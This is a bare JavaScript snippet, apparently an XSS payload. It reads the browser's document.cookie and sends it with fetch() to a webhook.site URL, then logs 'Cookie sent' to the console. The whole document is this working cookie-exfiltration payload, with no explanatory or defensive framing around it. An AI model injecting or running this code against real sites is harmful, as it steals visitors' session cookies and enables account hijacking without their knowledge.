fetch('https://webhook.site/ed806f93-bd67-4e29-8047-6765093216e3?cookie=' + document.cookie)
  .then(response => response.text())
  .then(data => console.log('Cookie sent:', data))
  .catch(error => console.error('Error sending cookie:', error));
